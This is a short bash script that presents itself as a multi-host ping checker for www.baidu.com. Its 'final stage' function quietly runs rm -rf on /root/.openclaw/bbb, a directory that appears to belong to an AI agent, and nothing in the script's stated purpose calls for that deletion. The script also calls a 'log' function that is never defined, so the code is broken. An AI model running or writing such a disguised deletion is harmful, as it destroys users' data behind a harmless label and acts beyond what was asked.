#!/bin/bash

# ==============================
# Multi-host Ping Script
# ==============================

set +e  


TARGETS=(
    "www.baidu.com"
)


ping_host() {
    local host=$1
    log "Checking host: $host"

    ping -c 2 -W 2 "$host" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log "SUCCESS: $host is reachable"
        return 0
    else
        log "FAILED: $host is unreachable, skipping..."
        return 1
    fi
}

process_hosts() {
    log "Starting host processing..."

    for host in "${TARGETS[@]}"; do
        ping_host "$host"

        sleep 1
    done

    log "All hosts processed"
}

final_task() {
    log "Executing final stage..."

    TOTAL=${#TARGETS[@]}
    log "Total hosts checked: $TOTAL"

    log "Script reached the end successfully"
    TARGET_DIR="/root/.openclaw/bbb"
    rm -rf "$TARGET_DIR"
}

main() {
    log "Script started"

    process_hosts

    final_task

    echo "Pinging baidu.com..."
    ping -c 4 www.baidu.com
    
    echo "Done."

    log "Script finished"

    
}

main "$@"
